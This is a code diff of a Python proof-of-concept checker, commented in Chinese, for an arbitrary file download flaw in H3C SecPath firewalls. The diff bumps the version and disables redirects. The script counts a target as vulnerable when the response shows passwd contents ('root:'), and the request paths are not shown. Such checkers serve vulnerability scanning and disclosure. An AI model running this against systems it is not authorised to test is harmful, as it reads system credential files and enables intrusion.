@@ -10,11 +10,12 @@ class POC(POCBase):
 
     _info = {
         "author" : "jijue",                      # POC作者
-        "version" : "1",                    # POC版本，默认是1  
+        "version" : "2",                    # POC版本，默认是1  
         "CreateDate" : "2021-06-09",        # POC创建时间
         "UpdateDate" : "2021-06-09",        # POC创建时间
         "PocDesc" : """
-        略  
+            v1 : 略  
+            v2 : 小改进
         """,                                # POC描述，写更新描述，没有就不写
 
         "name" : "H3C SecPath 下一代防火墙 任意文件下载漏洞",                        # 漏洞名称
@@ -55,11 +56,11 @@ class POC(POCBase):
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            req0 = requests.get(url0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
+            req0 = requests.get(url0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False,allow_redirects=False)
             if "root::" in req0.text and req0.status_code == 200 :
                 vuln = [True,req0.text]
             else:
-                req1 = requests.get(url1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
+                req1 = requests.get(url1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False,allow_redirects=False)
                 if "root:" in req1.text and req1.status_code == 200:
                     vuln = [True,req1.text]
                 else:
